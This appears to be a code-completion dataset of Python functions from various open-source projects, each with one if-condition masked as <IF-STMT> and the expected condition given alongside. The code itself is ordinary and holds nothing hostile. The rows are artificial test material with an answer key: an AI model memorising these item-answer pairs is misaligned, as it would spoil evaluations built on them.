4398,"def update_channel_entries(self, request):<tab>try:<tab><tab>request_parsed = await request.json()<tab>except (ContentTypeError, ValueError):<tab><tab>return RESTResponse({""error"": ""Bad JSON""}, status=HTTP_BAD_REQUEST)<tab>results_list = []<tab>for entry in request_parsed:<tab><tab>public_key = database_blob(unhexlify(entry.pop(""public_key"")))<tab><tab>id_ = entry.pop(""id"")<tab><tab>error, result = self.update_entry(public_key, id_, entry)<tab><tab># TODO: handle the results for a list that contains some errors in a smarter way<tab><tab><IF-STMT><tab><tab><tab>return RESTResponse(result, status=error)<tab><tab>results_list.append(result)<tab>return RESTResponse(results_list)",if error :,194
4399,"def delete(self, userId: str, bucket: str, key: str) -> bool:<tab>if not self.initialized:<tab><tab>raise Exception(""archive not initialized"")<tab>try:<tab><tab>with db.session_scope() as dbsession:<tab><tab><tab>rc = db_archivedocument.delete(userId, bucket, key, session=dbsession)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise Exception(""failed to delete DB record"")<tab><tab><tab>else:<tab><tab><tab><tab>return True<tab>except Exception as err:<tab><tab>raise err",if not rc :,130
4400,"def handle_phase(task, config):<tab>""""""Function that runs all of the configured plugins which act on the current phase.""""""<tab># Keep a list of all results, for input plugin combining<tab>results = []<tab>for item in config:<tab><tab>for plugin_name, plugin_config in item.items():<tab><tab><tab>if phase in plugin.get_phases_by_plugin(plugin_name):<tab><tab><tab><tab>method = plugin.get_plugin_by_name(plugin_name).phase_handlers[phase]<tab><tab><tab><tab>log.debug(""Running plugin %s"" % plugin_name)<tab><tab><tab><tab>result = method(task, plugin_config)<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>results.append(result)<tab>return itertools.chain(*results)","if phase == ""input"" and result :",188
4401,"def guess_gitlab_remote(self):<tab>upstream = self.get_upstream_for_active_branch()<tab>integrated_remote = self.get_integrated_remote_name()<tab>remotes = self.get_remotes()<tab>if len(self.remotes) == 1:<tab><tab>return list(remotes.keys())[0]<tab>elif upstream:<tab><tab>tracked_remote = upstream.split(""/"")[0] if upstream else None<tab><tab><IF-STMT><tab><tab><tab>return tracked_remote<tab><tab>else:<tab><tab><tab>return None<tab>else:<tab><tab>return integrated_remote",if tracked_remote and tracked_remote == integrated_remote :,154
4402,"def do_test(self, path):<tab>reader = paddle.reader.creator.recordio(path)<tab>idx = 0<tab>for e in reader():<tab><tab>if idx == 0:<tab><tab><tab>self.assertEqual(e, (1, 2, 3))<tab><tab><IF-STMT><tab><tab><tab>self.assertEqual(e, (4, 5, 6))<tab><tab>idx += 1<tab>self.assertEqual(idx, 2)",elif idx == 1 :,106
4403,"def gen_cpu_name(cpu):<tab>if cpu == ""simple"":<tab><tab>return event_download.get_cpustr()<tab>for j in known_cpus:<tab><tab>if cpu == j[0]:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return ""GenuineIntel-6-%02X-%d"" % j[1][0]<tab><tab><tab>else:<tab><tab><tab><tab>return ""GenuineIntel-6-%02X"" % j[1][0]<tab>assert False","if isinstance ( j [ 1 ] [ 0 ] , tuple ) :",127
4404,"def read_kernel_cmdline_config(cmdline=None):<tab>if cmdline is None:<tab><tab>cmdline = util.get_cmdline()<tab>if ""network-config="" in cmdline:<tab><tab>data64 = None<tab><tab>for tok in cmdline.split():<tab><tab><tab>if tok.startswith(""network-config=""):<tab><tab><tab><tab>data64 = tok.split(""="", 1)[1]<tab><tab><IF-STMT><tab><tab><tab>if data64 == KERNEL_CMDLINE_NETWORK_CONFIG_DISABLED:<tab><tab><tab><tab>return {""config"": ""disabled""}<tab><tab><tab>return util.load_yaml(_b64dgz(data64))<tab>return None",if data64 :,152
4405,"def _verify_bot(self, ctx: ""Context"") -> None:<tab>if ctx.guild is None:<tab><tab>bot_user = ctx.bot.user<tab>else:<tab><tab>bot_user = ctx.guild.me<tab><tab>cog = ctx.cog<tab><tab><IF-STMT><tab><tab><tab>raise discord.ext.commands.DisabledCommand()<tab>bot_perms = ctx.channel.permissions_for(bot_user)<tab>if not (bot_perms.administrator or bot_perms >= self.bot_perms):<tab><tab>raise BotMissingPermissions(<tab><tab><tab>missing=self._missing_perms(self.bot_perms, bot_perms)<tab><tab>)","if cog and await ctx . bot . cog_disabled_in_guild ( cog , ctx . guild ) :",181
4406,"def _split_values(self, value):<tab># do the regex mojo here<tab>if not self.allowed_values:<tab><tab>return ("""",)<tab>try:<tab><tab>r = re.compile(self.allowed_values)<tab>except:<tab><tab>print(self.allowed_values, file=sys.stderr)<tab><tab>raise<tab>s = str(value)<tab>i = 0<tab>vals = []<tab>while True:<tab><tab>m = r.search(s[i:])<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>vals.append(m.group())<tab><tab>delimiter = s[i : i + m.start()]<tab><tab>if self.delimiter is None and delimiter != """":<tab><tab><tab>self.delimiter = delimiter<tab><tab>i += m.end()<tab>return tuple(vals)",if m is None :,192
4407,"def _count(self, element, count=True):<tab>if not isinstance(element, six.string_types):<tab><tab>if self == element:<tab><tab><tab>return 1<tab>i = 0<tab>for child in self.children:<tab><tab># child is text content and element is also text content, then<tab><tab># make a simple ""text"" in ""text""<tab><tab>if isinstance(child, six.string_types):<tab><tab><tab>if isinstance(element, six.string_types):<tab><tab><tab><tab>if count:<tab><tab><tab><tab><tab>i += child.count(element)<tab><tab><tab><tab>elif element in child:<tab><tab><tab><tab><tab>return 1<tab><tab>else:<tab><tab><tab>i += child._count(element, count=count)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return i<tab>return i",if not count and i :,196
4408,"def set_page(self, page):<tab>""""""If a page is present as a bookmark than select it.""""""<tab>pagename = page.name<tab>with self.on_bookmark_clicked.blocked():<tab><tab>for button in self.scrolledbox.get_scrolled_children():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>button.set_active(True)<tab><tab><tab>else:<tab><tab><tab><tab>button.set_active(False)",if button . zim_path == pagename :,112
4409,"def get_Subclass_of(rt):<tab>for y in [getattr(Ast, x) for x in dir(Ast)]:<tab><tab>yt = clr.GetClrType(y)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if yt.IsAbstract:<tab><tab><tab>continue<tab><tab>if yt.IsSubclassOf(rt):<tab><tab><tab>yield yt.Name",if rt == yt :,93
4410,"def update_parent_columns(self):<tab>""Update the parent columns of the current focus column.""<tab>f = self.columns.get_focus_column()<tab>col = self.col_list[f]<tab>while 1:<tab><tab>parent, pcol = self.get_parent(col)<tab><tab>if pcol is None:<tab><tab><tab>return<tab><tab>changed = pcol.update_results(start_from=parent)<tab><tab><IF-STMT><tab><tab><tab>return<tab><tab>col = pcol",if not changed :,121
4411,"def get_template_engine(themes):<tab>""""""Get template engine used by a given theme.""""""<tab>for theme_name in themes:<tab><tab>engine_path = os.path.join(theme_name, ""engine"")<tab><tab><IF-STMT><tab><tab><tab>with open(engine_path) as fd:<tab><tab><tab><tab>return fd.readlines()[0].strip()<tab># default<tab>return ""mako""",if os . path . isfile ( engine_path ) :,104
4412,"def reConnect(self):<tab>while self.retrymax is None or self.retries < self.retrymax:<tab><tab>logger.info(""Cobra reconnection attempt"")<tab><tab>try:<tab><tab><tab>self.conn = self.httpfact()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.authUser(self.authinfo)<tab><tab><tab>self.retries = 0<tab><tab><tab>return<tab><tab>except Exception as e:<tab><tab><tab>time.sleep(2 ** self.retries)<tab><tab><tab>self.retries += 1<tab>self.trashed = True<tab>raise CobraHttpException(""Retry Exceeded!"")",if self . _cobra_sessid :,149
4413,"def __eq__(self, other):<tab>if isinstance(other, OrderedDict):<tab><tab>if len(self) != len(other):<tab><tab><tab>return False<tab><tab>for p, q in zip(list(self.items()), list(other.items())):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return False<tab><tab>return True<tab>return dict.__eq__(self, other)",if p != q :,91
4414,"def __getExpectedSampleOffsets(self, tileOrigin, area1, area2):<tab>ts = GafferImage.ImagePlug.tileSize()<tab>data = []<tab>for y in range(tileOrigin.y, tileOrigin.y + ts):<tab><tab>for x in range(tileOrigin.x, tileOrigin.x + ts):<tab><tab><tab>pixel = imath.V2i(x, y)<tab><tab><tab>data.append(data[-1] if data else 0)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>data[-1] += 1<tab><tab><tab>if GafferImage.BufferAlgo.contains(area2, pixel):<tab><tab><tab><tab>data[-1] += 1<tab>return IECore.IntVectorData(data)","if GafferImage . BufferAlgo . contains ( area1 , pixel ) :",190
4415,"def _get_changes(self):<tab>""""""Get changes from CHANGES.txt.""""""<tab>log_lines = []<tab>found_version = False<tab>found_items = False<tab>with open(""CHANGES.txt"", ""r"") as fp:<tab><tab>for line in fp.readlines():<tab><tab><tab>line = line.rstrip()<tab><tab><tab>if line.endswith(VERSION_TEXT_SHORT):<tab><tab><tab><tab>found_version = True<tab><tab><tab>if not line.strip() and found_items:<tab><tab><tab><tab>break<tab><tab><tab><IF-STMT><tab><tab><tab><tab>log_lines.append("" "" * 2 + ""* "" + line[2:])<tab><tab><tab><tab>found_items = True<tab>return log_lines","elif found_version and line . startswith ( ""- "" ) :",174
4416,"def _next_hid(self, n=1):<tab># this is overriden in mapping.py db_next_hid() method<tab>if len(self.datasets) == 0:<tab><tab>return n<tab>else:<tab><tab>last_hid = 0<tab><tab>for dataset in self.datasets:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>last_hid = dataset.hid<tab><tab>return last_hid + n",if dataset . hid > last_hid :,105
4417,"def setInt(self, path, value, **kwargs):<tab>if value is None:<tab><tab>self.set(path, None, **kwargs)<tab><tab>return<tab>minimum = kwargs.pop(""min"", None)<tab>maximum = kwargs.pop(""max"", None)<tab>try:<tab><tab>intValue = int(value)<tab><tab>if minimum is not None and intValue < minimum:<tab><tab><tab>intValue = minimum<tab><tab><IF-STMT><tab><tab><tab>intValue = maximum<tab>except ValueError:<tab><tab>self._logger.warning(<tab><tab><tab>""Could not convert %r to a valid integer when setting option %r""<tab><tab><tab>% (value, path)<tab><tab>)<tab><tab>return<tab>self.set(path, intValue, **kwargs)",if maximum is not None and intValue > maximum :,187
4418,"def _load_idle_extensions(self, sub_section, fp, lineno):<tab>extension_map = self.get_data(""idle extensions"")<tab>if extension_map is None:<tab><tab>extension_map = {}<tab>extensions = []<tab>while 1:<tab><tab>line, lineno, bBreak = self._readline(fp, lineno)<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>line = line.strip()<tab><tab>if line:<tab><tab><tab>extensions.append(line)<tab>extension_map[sub_section] = extensions<tab>self._save_data(""idle extensions"", extension_map)<tab>return line, lineno",if bBreak :,149
4419,"def _get_config(key):<tab>config = db.session.execute(<tab><tab>Configs.__table__.select().where(Configs.key == key)<tab>).fetchone()<tab>if config and config.value:<tab><tab>value = config.value<tab><tab><IF-STMT><tab><tab><tab>return int(value)<tab><tab>elif value and isinstance(value, string_types):<tab><tab><tab>if value.lower() == ""true"":<tab><tab><tab><tab>return True<tab><tab><tab>elif value.lower() == ""false"":<tab><tab><tab><tab>return False<tab><tab><tab>else:<tab><tab><tab><tab>return value<tab># Flask-Caching is unable to roundtrip a value of None.<tab># Return an exception so that we can still cache and avoid the db hit<tab>return KeyError",if value and value . isdigit ( ) :,181
4420,"def check_labels(self):<tab>print(""Checking labels if they are outside the image"")<tab>for i in self.Dataframe.index:<tab><tab>image_name = os.path.join(self.project_path, i)<tab><tab>im = PIL.Image.open(image_name)<tab><tab>self.width, self.height = im.size<tab><tab>for ind in self.individual_names:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.Dataframe = MainFrame.force_outside_labels_Nans(<tab><tab><tab><tab><tab>self, i, ind, self.uniquebodyparts<tab><tab><tab><tab>)<tab><tab><tab>else:<tab><tab><tab><tab>self.Dataframe = MainFrame.force_outside_labels_Nans(<tab><tab><tab><tab><tab>self, i, ind, self.multianimalbodyparts<tab><tab><tab><tab>)<tab>return self.Dataframe","if ind == ""single"" :",196
4421,"def remove_excluded(self):<tab>""""""Remove all sources marked as excluded.""""""<tab># import yaml<tab># print yaml.dump({k:v.__json__() for k,v in self.sources.items()}, default_flow_style=False)<tab>sources = list(self.sources.values())<tab>for src in sources:<tab><tab><IF-STMT><tab><tab><tab>del self.sources[src.name]<tab><tab>src.imports = [m for m in src.imports if not self._exclude(m)]<tab><tab>src.imported_by = [m for m in src.imported_by if not self._exclude(m)]",if src . excluded :,146
4422,"def parse_scientific_formats(data, tree):<tab>scientific_formats = data.setdefault(""scientific_formats"", {})<tab>for elem in tree.findall("".//scientificFormats/scientificFormatLength""):<tab><tab>type = elem.attrib.get(""type"")<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>pattern = text_type(elem.findtext(""scientificFormat/pattern""))<tab><tab>scientific_formats[type] = numbers.parse_pattern(pattern)","if _should_skip_elem ( elem , type , scientific_formats ) :",132
4423,"def _modifierCodes2Labels(cls, mods):<tab><IF-STMT><tab><tab>return []<tab>modconstants = cls._modifierCodes<tab>modNameList = []<tab>for k in modconstants._keys:<tab><tab>mc = modconstants._names[k]<tab><tab>if mods & k == k:<tab><tab><tab>modNameList.append(mc)<tab><tab><tab>mods = mods - k<tab><tab><tab>if mods == 0:<tab><tab><tab><tab>return modNameList<tab>return modNameList",if mods == 0 :,121
4424,"def to_pig_latin(text: str):<tab>if text is None:<tab><tab>return """"<tab>words = text.lower().strip().split("" "")<tab>text = []<tab>for word in words:<tab><tab>if word[0] in ""aeiou"":<tab><tab><tab>text.append(f""{word}yay"")<tab><tab>else:<tab><tab><tab>for letter in word:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>text.append(<tab><tab><tab><tab><tab><tab>f""{word[word.index(letter):]}{word[:word.index(letter)]}ay""<tab><tab><tab><tab><tab>)<tab><tab><tab><tab><tab>break<tab>return "" "".join(text)","if letter in ""aeiou"" :",165
4425,"def __connect__(self) -> H2Protocol:<tab><IF-STMT><tab><tab>async with self._connect_lock:<tab><tab><tab>self._state = _ChannelState.CONNECTING<tab><tab><tab>if not self._connected:<tab><tab><tab><tab>try:<tab><tab><tab><tab><tab>self._protocol = await self._create_connection()<tab><tab><tab><tab>except Exception:<tab><tab><tab><tab><tab>self._state = _ChannelState.TRANSIENT_FAILURE<tab><tab><tab><tab><tab>raise<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>self._state = _ChannelState.READY<tab>return cast(H2Protocol, self._protocol)",if not self . _connected :,147
4426,"def run_commands(cmds):<tab>set_kubeconfig_environment_var()<tab>for cmd in cmds:<tab><tab>process = subprocess.run(<tab><tab><tab>cmd,<tab><tab><tab>shell=True,<tab><tab><tab>check=True,<tab><tab><tab>universal_newlines=True,<tab><tab><tab>stdout=subprocess.PIPE,<tab><tab><tab>stderr=subprocess.PIPE,<tab><tab><tab>env=os.environ,<tab><tab>)<tab><tab>if process.stdout:<tab><tab><tab>logger.info(process.stdout)<tab><tab><IF-STMT><tab><tab><tab>logger.info(process.stderr)<tab>return process.stdout",if process . stderr :,146
4427,"def deserialize(x):<tab>t = type(x)<tab>if t is list:<tab><tab>return list(imap(deserialize, x))<tab>if t is dict:<tab><tab><IF-STMT><tab><tab><tab>return {key: deserialize(val) for key, val in iteritems(x)}<tab><tab>obj = objmap.get(x[""_id_""])<tab><tab>if obj is None:<tab><tab><tab>entity_name = x[""class""]<tab><tab><tab>entity = database.entities[entity_name]<tab><tab><tab>pk = x[""_pk_""]<tab><tab><tab>obj = entity[pk]<tab><tab>return obj<tab>return x","if ""_id_"" not in x :",150
4428,"def _parse_arguments(self, handler_method):<tab>spec = DynamicArgumentParser().parse(self._argspec, self.longname)<tab>if not self._supports_kwargs:<tab><tab><IF-STMT><tab><tab><tab>raise DataError(<tab><tab><tab><tab>""Too few '%s' method parameters for **kwargs ""<tab><tab><tab><tab>""support."" % self._run_keyword_method_name<tab><tab><tab>)<tab><tab>if spec.kwonlyargs:<tab><tab><tab>raise DataError(<tab><tab><tab><tab>""Too few '%s' method parameters for ""<tab><tab><tab><tab>""keyword-only arguments support."" % self._run_keyword_method_name<tab><tab><tab>)<tab>spec.types = GetKeywordTypes(self.library.get_instance())(self._handler_name)<tab>return spec",if spec . kwargs :,183
4429,"def test_update_password_command(mocker, username, password, expected, changed):<tab>with mocker.patch.object(UpdatePassword, ""update_password"", return_value=changed):<tab><tab>result, stdout, stderr = run_command(<tab><tab><tab>""update_password"", username=username, password=password<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>assert stdout == expected<tab><tab>else:<tab><tab><tab>assert str(result) == expected",if result is None :,108
4430,"def characters(self, ch):<tab>if self.Text_tag:<tab><tab>if self.Summary_tag:<tab><tab><tab>self.Summary_ch += ch<tab><tab><IF-STMT><tab><tab><tab>self.Attack_Prerequisite_ch += ch<tab><tab>elif self.Solution_or_Mitigation_tag:<tab><tab><tab>self.Solution_or_Mitigation_ch += ch<tab>elif self.CWE_ID_tag:<tab><tab>self.CWE_ID_ch += ch",elif self . Attack_Prerequisite_tag :,127
4431,"def _pybin_add_zip(pybin, libname, filter, exclusions, dirs, dirs_with_init_py):<tab>with zipfile.ZipFile(libname, ""r"") as lib:<tab><tab>name_list = lib.namelist()<tab><tab>for name in name_list:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>if dirs is not None and dirs_with_init_py is not None:<tab><tab><tab><tab><tab>_update_init_py_dirs(name, dirs, dirs_with_init_py)<tab><tab><tab><tab>pybin.writestr(name, lib.read(name))","if filter ( name ) and not _is_python_excluded_path ( name , exclusions ) :",158
4432,"def parseAGL(filename):  # -> { 2126: 'Omega', ... }<tab>m = {}<tab>for line in readLines(filename):<tab><tab># Omega;2126<tab><tab># dalethatafpatah;05D3 05B2   # higher-level combinations; ignored<tab><tab>line = line.strip()<tab><tab>if len(line) > 0 and line[0] != ""#"":<tab><tab><tab>name, uc = tuple([c.strip() for c in line.split("";"")])<tab><tab><tab><IF-STMT><tab><tab><tab><tab># it's a 1:1 mapping<tab><tab><tab><tab>m[int(uc, 16)] = name<tab>return m","if uc . find ( "" "" ) == - 1 :",169
4433,"def assertS_IS(self, name, mode):<tab># test format, lstrip is for S_IFIFO<tab>fmt = getattr(stat, ""S_IF"" + name.lstrip(""F""))<tab>self.assertEqual(stat.S_IFMT(mode), fmt)<tab># test that just one function returns true<tab>testname = ""S_IS"" + name<tab>for funcname in self.format_funcs:<tab><tab>func = getattr(stat, funcname, None)<tab><tab><IF-STMT><tab><tab><tab>if funcname == testname:<tab><tab><tab><tab>raise ValueError(funcname)<tab><tab><tab>continue<tab><tab>if funcname == testname:<tab><tab><tab>self.assertTrue(func(mode))<tab><tab>else:<tab><tab><tab>self.assertFalse(func(mode))",if func is None :,180
4434,"def metadata(draft):<tab>test_metadata = {}<tab>json_schema = create_jsonschema_from_metaschema(draft.registration_schema.schema)<tab>for key, value in json_schema[""properties""].items():<tab><tab>response = ""Test response""<tab><tab>items = value[""properties""][""value""].get(""items"")<tab><tab>enum = value[""properties""][""value""].get(""enum"")<tab><tab><IF-STMT>  # multiselect<tab><tab><tab>response = [items[""enum""][0]]<tab><tab>elif enum:  # singleselect<tab><tab><tab>response = enum[0]<tab><tab>elif value[""properties""][""value""].get(""properties""):<tab><tab><tab>response = {""question"": {""value"": ""Test Response""}}<tab><tab>test_metadata[key] = {""value"": response}<tab>return test_metadata",if items :,185
4435,"def decode_binary(binarystring):<tab>""""""Decodes a binary string into it's integer value.""""""<tab>n = 0<tab>for c in binarystring:<tab><tab><IF-STMT><tab><tab><tab>d = 0<tab><tab>elif c == ""1"":<tab><tab><tab>d = 1<tab><tab>else:<tab><tab><tab>raise ValueError(""Not an binary number"", binarystring)<tab><tab># Could use ((n << 3 ) | d), but python 2.3 issues a FutureWarning.<tab><tab>n = (n * 2) + d<tab>return n","if c == ""0"" :",126
4436,"def getZoneOffset(d):<tab>zoffs = 0<tab>try:<tab><tab><IF-STMT><tab><tab><tab>zoffs = 60 * int(d[""tzhour""]) + int(d[""tzminute""])<tab><tab><tab>if d[""tzsign""] != ""-"":<tab><tab><tab><tab>zoffs = -zoffs<tab>except TypeError:<tab><tab>pass<tab>return zoffs","if d [ ""zulu"" ] == None :",92
4437,"def TryMerge(self, d):<tab>while d.avail() > 0:<tab><tab>tt = d.getVarInt32()<tab><tab><IF-STMT><tab><tab><tab>self.add_module(d.getPrefixedString())<tab><tab><tab>continue<tab><tab>if tt == 0:<tab><tab><tab>raise ProtocolBuffer.ProtocolBufferDecodeError<tab><tab>d.skipData(tt)",if tt == 10 :,90
4438,"def _flow_open(self):<tab>rv = []<tab>for pipe in self.pipes:<tab><tab>if pipe._pipeline_all_methods_.issuperset({""open"", self._method_open}):<tab><tab><tab>raise RuntimeError(<tab><tab><tab><tab>f""{pipe.__class__.__name__} pipe has double open methods.""<tab><tab><tab><tab>f"" Use `open` or `{self._method_open}`, not both.""<tab><tab><tab>)<tab><tab>if ""open"" in pipe._pipeline_all_methods_:<tab><tab><tab>rv.append(pipe.open)<tab><tab><IF-STMT><tab><tab><tab>rv.append(getattr(pipe, self._method_open))<tab>return rv",if self . _method_open in pipe . _pipeline_all_methods_ :,167
4439,"def list_and_filter_commands(filter_str):<tab>sorted_commands = list(_pwndbg.commands.commands)<tab>sorted_commands.sort(key=lambda x: x.__name__)<tab>if filter_str:<tab><tab>filter_str = filter_str.lower()<tab>results = []<tab>for c in sorted_commands:<tab><tab>name = c.__name__<tab><tab>docs = c.__doc__<tab><tab><IF-STMT><tab><tab><tab>docs = docs.strip()<tab><tab>if docs:<tab><tab><tab>docs = docs.splitlines()[0]<tab><tab>if (<tab><tab><tab>not filter_str<tab><tab><tab>or filter_str in name.lower()<tab><tab><tab>or (docs and filter_str in docs.lower())<tab><tab>):<tab><tab><tab>results.append((name, docs))<tab>return results",if docs :,195
4440,"def _scale_action(action: np.ndarray, spec: specs.Array):<tab>""""""Converts a single canonical action back to the given action spec.""""""<tab>if isinstance(spec, specs.BoundedArray):<tab><tab># Get scale and offset of output action spec.<tab><tab>scale = spec.maximum - spec.minimum<tab><tab>offset = spec.minimum<tab><tab># Maybe clip the action.<tab><tab><IF-STMT><tab><tab><tab>action = np.clip(action, -1.0, 1.0)<tab><tab># Map action to [0, 1].<tab><tab>action = 0.5 * (action + 1.0)<tab><tab># Map action to [spec.minimum, spec.maximum].<tab><tab>action *= scale<tab><tab>action += offset<tab>return action",if clip :,176
4441,"def genData(self, samples, inc, sps):<tab>self.prepModData(samples, inc, sps)<tab>data = Array.CreateInstance(float, samples)<tab>cycleLen = float(sps) / gcdlist(self.findAllFreq())<tab>p = 1.0<tab>c = 0<tab>for i in range(int(cycleLen)):<tab><tab>data[i] = p * self.ampl<tab><tab>c = c + 2 * inc * self.freq * self.addModData(i)<tab><tab><IF-STMT><tab><tab><tab>p = 1.0<tab><tab>else:<tab><tab><tab>p = -1.0<tab>self.fillData(cycleLen, samples, data)<tab>return data",if int ( c ) % 2 == 0 :,175
4442,"def data_type(data, grouped=False, columns=None, key_on=""idx"", iter_idx=None):<tab>""""""Data type check for automatic import""""""<tab>if iter_idx:<tab><tab>return Data.from_mult_iters(idx=iter_idx, **data)<tab>if pd:<tab><tab><IF-STMT><tab><tab><tab>return Data.from_pandas(<tab><tab><tab><tab>data, grouped=grouped, columns=columns, key_on=key_on<tab><tab><tab>)<tab>if isinstance(data, (list, tuple, dict)):<tab><tab>return Data.from_iter(data)<tab>else:<tab><tab>raise ValueError(""This data type is not supported by Vincent."")","if isinstance ( data , ( pd . Series , pd . DataFrame ) ) :",173
4443,"def addNames(self, import_names, node_names):<tab>for names in node_names:<tab><tab>if isinstance(names, basestring):<tab><tab><tab>name = names<tab><tab><IF-STMT><tab><tab><tab>name = names[0]<tab><tab>else:<tab><tab><tab>name = names[1]<tab><tab>import_names[name] = True",elif names [ 1 ] is None :,88
4444,"def validate_address(address_name):<tab>fields = [""pincode"", ""city"", ""country_code""]<tab>data = frappe.get_cached_value(""Address"", address_name, fields, as_dict=1) or {}<tab>for field in fields:<tab><tab><IF-STMT><tab><tab><tab>frappe.throw(<tab><tab><tab><tab>_(""Please set {0} for address {1}"").format(<tab><tab><tab><tab><tab>field.replace(""-"", """"), address_name<tab><tab><tab><tab>),<tab><tab><tab><tab>title=_(""E-Invoicing Information Missing""),<tab><tab><tab>)",if not data . get ( field ) :,142
4445,"def content(computer, name, values):<tab>""""""Compute the ``content`` property.""""""<tab>if len(values) == 1:<tab><tab>(value,) = values<tab><tab><IF-STMT><tab><tab><tab>return ""inhibit"" if computer[""pseudo_type""] else ""contents""<tab><tab>elif value == ""none"":<tab><tab><tab>return ""inhibit""<tab>return _content_list(computer, values)","if value == ""normal"" :",101
4446,"def _replace_list(self, items):<tab>results = []<tab>for item in items:<tab><tab>listvar = self._replace_variables_inside_possible_list_var(item)<tab><tab><IF-STMT><tab><tab><tab>results.extend(self[listvar])<tab><tab>else:<tab><tab><tab>results.append(self.replace_scalar(item))<tab>return results",if listvar :,90
4447,"def _groups_args_split(self, kwargs):<tab>groups_args_split = []<tab>groups = kwargs[""groups""]<tab>for key, group in groups.iteritems():<tab><tab>mykwargs = kwargs.copy()<tab><tab>del mykwargs[""groups""]<tab><tab><IF-STMT><tab><tab><tab>mykwargs[""source_security_group_name""] = group[""group_name""]<tab><tab>if ""user_id"" in group:<tab><tab><tab>mykwargs[""source_security_group_owner_id""] = group[""user_id""]<tab><tab>if ""group_id"" in group:<tab><tab><tab>mykwargs[""source_security_group_id""] = group[""group_id""]<tab><tab>groups_args_split.append(mykwargs)<tab>return groups_args_split","if ""group_name"" in group :",186
4448,"def WriteFlowOutputPluginLogEntries(self, entries):<tab>""""""Writes flow output plugin log entries.""""""<tab>flow_ids = [(e.client_id, e.flow_id) for e in entries]<tab>for f in flow_ids:<tab><tab><IF-STMT><tab><tab><tab>raise db.AtLeastOneUnknownFlowError(flow_ids)<tab>for e in entries:<tab><tab>dest = self.flow_output_plugin_log_entries.setdefault(<tab><tab><tab>(e.client_id, e.flow_id), []<tab><tab>)<tab><tab>to_write = e.Copy()<tab><tab>to_write.timestamp = rdfvalue.RDFDatetime.Now()<tab><tab>dest.append(to_write)",if f not in self . flows :,173
4449,def connect(**auth):<tab>key = tuple(sorted(auth.items()))<tab>if key in connection_pool:<tab><tab>ssh = connection_pool[key]<tab><tab><IF-STMT><tab><tab><tab>ssh.connect(**auth)<tab>else:<tab><tab>ssh = paramiko.SSHClient()<tab><tab>ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())<tab><tab>ssh.connect(**auth)<tab><tab>connection_pool[key] = ssh<tab>return ssh,if not ssh . get_transport ( ) or not ssh . get_transport ( ) . is_active ( ) :,131
4450,"def __call__(self, *args, **kwargs):<tab>if self is S:<tab><tab><IF-STMT><tab><tab><tab>raise TypeError(""S() takes no positional arguments, got: %r"" % (args,))<tab><tab>if not kwargs:<tab><tab><tab>raise TypeError(""S() expected at least one kwarg, got none"")<tab><tab># TODO: typecheck kwarg vals?<tab>return _t_child(self, ""("", (args, kwargs))",if args :,101
4451,"def read_images(self, paths=[]):<tab>images = []<tab>for img_path in paths:<tab><tab>assert os.path.isfile(img_path), ""The {} isn't a valid file."".format(img_path)<tab><tab>img = cv2.imread(img_path)<tab><tab><IF-STMT><tab><tab><tab>logger.info(""error in loading image:{}"".format(img_path))<tab><tab><tab>continue<tab><tab>img = img[:, :, ::-1]<tab><tab>images.append(img)<tab>return images",if img is None :,123
4452,"def get_polymorphic_model(data):<tab>for model in itervalues(models):<tab><tab>polymorphic = model.opts.polymorphic<tab><tab>if polymorphic:<tab><tab><tab>polymorphic_key = polymorphic<tab><tab><tab><IF-STMT><tab><tab><tab><tab>polymorphic_key = ""type""<tab><tab><tab>if data.get(polymorphic_key) == model.__name__:<tab><tab><tab><tab>return model<tab>raise ImproperlyConfigured(u""No model found for data: {!r}"".format(data))","if isinstance ( polymorphic_key , bool ) :",133
4453,"def parse_counter_style_name(tokens, counter_style):<tab>tokens = remove_whitespace(tokens)<tab>if len(tokens) == 1:<tab><tab>(token,) = tokens<tab><tab>if token.type == ""ident"":<tab><tab><tab><IF-STMT><tab><tab><tab><tab>if token.lower_value not in counter_style:<tab><tab><tab><tab><tab>return token.value<tab><tab><tab>elif token.lower_value != ""none"":<tab><tab><tab><tab>return token.value","if token . lower_value in ( ""decimal"" , ""disc"" ) :",122
4454,"def setUp(self):<tab>yield helpers.TestHandlerWithPopulatedDB.setUp(self)<tab>for r in (yield tw(user.db_get_users, 1, ""receiver"", ""en"")):<tab><tab><IF-STMT><tab><tab><tab>self.rcvr_id = r[""id""]","if r [ ""pgp_key_fingerprint"" ] == ""BFB3C82D1B5F6A94BDAC55C6E70460ABF9A4C8C1"" :",109
4455,"def check_that_oval_and_rule_id_match(xccdftree):<tab>for xccdfid, rule in rules_with_ids_generator(xccdftree):<tab><tab>checks = rule.find(""./{%s}check"" % XCCDF11_NS)<tab><tab><IF-STMT><tab><tab><tab>print(""Rule {0} doesn't have checks."".format(xccdfid), file=sys.stderr)<tab><tab><tab>continue<tab><tab>assert_that_check_ids_match_rule_id(checks, xccdfid)",if checks is None :,133
4456,"def MakeWidthArray(fm):<tab># Make character width array<tab>s = ""{\n\t""<tab>cw = fm[""Widths""]<tab>for i in xrange(0, 256):<tab><tab><IF-STMT><tab><tab><tab>s += ""'\\''""<tab><tab>elif chr(i) == ""\\"":<tab><tab><tab>s += ""'\\\\'""<tab><tab>elif i >= 32 and i <= 126:<tab><tab><tab>s += ""'"" + chr(i) + ""'""<tab><tab>else:<tab><tab><tab>s += ""chr(%d)"" % i<tab><tab>s += "":"" + fm[""Widths""][i]<tab><tab>if i < 255:<tab><tab><tab>s += "",""<tab><tab>if (i + 1) % 22 == 0:<tab><tab><tab>s += ""\n\t""<tab>s += ""}""<tab>return s","if chr ( i ) == ""'"" :",192
